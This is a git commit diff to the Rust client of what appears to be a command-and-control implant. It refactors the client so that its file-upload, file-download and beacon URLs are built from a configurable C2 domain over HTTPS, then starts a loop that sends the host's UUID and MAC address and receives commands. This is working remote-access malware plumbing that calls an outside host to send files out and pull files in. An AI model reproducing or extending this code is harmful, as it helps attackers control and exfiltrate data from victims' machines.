964356f555dbb02bfa1edce25da378bacb247a1c
bitsima <betulse42@gmail.com>
2024-08-01 13:23:38 +0300

    refactor: separate the c2 domain from the other urls

--- client/src/main.rs
+++ client/src/main.rs
@@ -3,9 +3,18 @@ mod commands;
 mod sysinfo;
 mod utils;
 
-const UPLOAD_URL: &str = "http://localhost:5000/api/v1/files";
-const DOWNLOAD_URL: &str = "http://localhost:5000/api/v1/send_file";
-const BEACON_URL: &str = "http://localhost:5000/api/v1/beacon";
+const C2_DOMAIN: &str = "";
+fn get_upload_url() -> String {
+    format!("https://{}:443/api/v1/files", C2_DOMAIN)
+}
+
+fn get_download_url() -> String {
+    format!("https://{}:443/api/v1/send_file", C2_DOMAIN)
+}
+
+fn get_beacon_url() -> String {
+    format!("https://{}:443/api/v1/beacon", C2_DOMAIN)
+}
 
 #[tokio::main]
 async fn main() {
@@ -13,5 +22,12 @@ async fn main() {
     let (uuid, mac_addr) = sysinfo::saver::save_file().expect("Error saving file");
 
     // Run the main loop to send beacons and receive commands
-    beacon::beacon::run(uuid, mac_addr, BEACON_URL, UPLOAD_URL, DOWNLOAD_URL).await;
+    beacon::beacon::run(
+        uuid,
+        mac_addr,
+        &get_beacon_url(),
+        &get_upload_url(),
+        &get_download_url(),
+    )
+    .await;
 }
